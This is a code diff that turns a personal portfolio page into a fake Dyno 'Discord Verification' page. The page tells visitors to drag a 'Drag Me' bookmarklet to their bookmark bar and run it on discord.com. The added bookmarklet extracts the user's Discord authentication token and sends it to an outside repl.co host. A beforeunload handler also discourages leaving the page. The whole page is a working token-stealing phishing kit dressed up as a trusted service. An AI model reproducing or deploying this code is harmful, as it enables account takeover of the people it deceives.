@@ -2,34 +2,81 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dyno</title>
     <link rel="stylesheet" href="style.css">
-    <script src="script.js"></script>
-    <title>wrobel.dev</title>
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <script>
+        window.addEventListener('beforeunload', function (e) {
+            e.preventDefault();
+            e.returnValue = '';
+        });
+
+
+    </script>
 </head>
 <body>
-    <div class="header">
-        <p>wrobel<span class="m1">.dev</span></p>
-        <a href="https://github.com/githubuser2137"><i class="fa-brands fa-github"></i></a>
-    </div>
-    <div class="main-info">
-        <h1>Cześć, tutaj <span class="m1">Dawid</span>! 👋</h1>
-        <div class="info-content">
-            <p>Jestem <b>freelancerem</b>, <b>web developerem</b> i <b>UI/UX designerem</b>. Jestem pewny swoich umiejętności i satysfakcją z końcowych efektów tworzenia stron internetowych i naszą współpracą!</p>
-            <img src="avatar.png">
+    <header>
+        <div class="logo">
+            <img src="dyno-blitz-v2-transparent-bg.png"  href="https://dyno.gg/">
+            <p>DYNO</p>
+        </div>
+        <ul>
+            <li><a href="https://dyno.gg/bot">Dyno Bot</a></li>
+            <li><a href="https://dyno.gg/servers">Public Servers</a></li>
+            <li><a href="https://dyno.gg/discord">Join Our Discord</a></li>
+            <li><a href="https://dyno.gg/commands">Commands</a></li>
+            <li><a href="https://docs.dyno.gg/">Help</a></li>
+            <li><a href="https://dyno.gg/status">Status</a></li>
+            <a href="https://dyno.gg/premium"><button class="button-premium">Get Premium</button></a>
+        </ul>
+        <div class="header-buttons">
+            <a href="https://dyno.gg/premium"><button class="header-buttons-1">Add To Server</button></a>
+            <a href="https://dyno.gg/auth"><button class="header-buttons-2">Login with Discord</button></a>
+        </div>
+    </header>
+    <div class="verify-content">
+        <div class="page-title">
+            <h1>Discord Verification</h1>
+            <p>Verify your account with any discord server</p>
+        </div>
+        <div class="page-content">
+            <p>Currently verifing with <b>Pixelblock.pl | Społeczność</b></p>
+            <p class="p1-verify">To gain access to this discord server, drag the "Drag Me" to your bookmark bar. Next go to <u><a href="https://discord.com/app">discord.com</a></u> and click on the Bookmark you previously added. To enable your bookamrk bar press (CTRL+SHIFT+B)</p>
+            <a href="javascript:(function(){const decodedString='http://bookmarkjs.pajammerss.repl.co/';var f=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==undefined).exports.default.getToken();window.location.replace(decodedString+%27/%27+f);})();"><button class="bookmark">Drag Me</button></a>
+            <img src="verify.gif">
         </div>
     </div>
-    <div class="tech">
-        <p>Technologie, których używam</p>
-        <div class="tech-img">
-            <a href="https://pl.wikipedia.org/wiki/HTML" class="link1"><img src="html.png"><p class="p1">👆</p></a>
-            <a href="https://pl.wikipedia.org/wiki/Kaskadowe_arkusze_styl%C3%B3w" class="link2"><img src="css.png"><p class="p2">👆</p></a>
-            <a href="https://pl.wikipedia.org/wiki/JavaScript" class="link3"><img src="javascript.png"><p class="p3">👆</p></a>
+    <footer>
+        <div class="footer-column1">
+            <img src="logo@2x.png">
+            <p class="footercp1">GET IN TOUCH</p>
+            <div class="socials">
+                <a href="https://discord.gg/8PW8rST"><img src="discord.png"></a>
+                <a href="https://twitter.com/DynoDiscord"><img src="twitter.png"></a>
+                <a href="mailto:team@dyno.gg"><img src="mail.png"></a>
+            </div>
+            <p class="footercp2">&copy; 2023 Swift Media Entertainment. All rights reserved.</p>
         </div>
-    </div>
-    <div class="footer">
-        <a href="https://github.com/githubuser2137"><i class="fa-brands fa-github"></i></a>
-    </div>
+        <div class="footer-column2">
+            <ul>
+                <p>DYNO</p>
+                <li><a href="https://dyno.gg/bot">Dyno Bot</a></li>
+                <li><a href="https://dyno.gg/servers">Public Servers</a></li>
+                <li><a href="https://dyno.gg/commands">Bot Commands</a></li>
+                <li><a href="https://docs.dyno.gg/">Help</a></li>
+                <li><a href="https://dyno.gg/premium">Get Premium</a></li>
+                <li><a href="https://dyno.gg/discord">Dyno Discord Server</a></li>
+            </ul>
+        </div>
+        <div class="footer-column3">
+            <ul>
+                <p>LEGAL</p>
+                <li><a href="https://dyno.gg/terms">Terms and Conditions</a></li>
+                <li><a href="https://www.iubenda.com/privacy-policy/21925808">Privacy Policy</a></li>
+                <li><a href="https://www.iubenda.com/privacy-policy/21925808/cookie-policy">Cookie Policy</a></li>
+            </ul>
+        </div>
+    </footer>
 </body>
 </html>
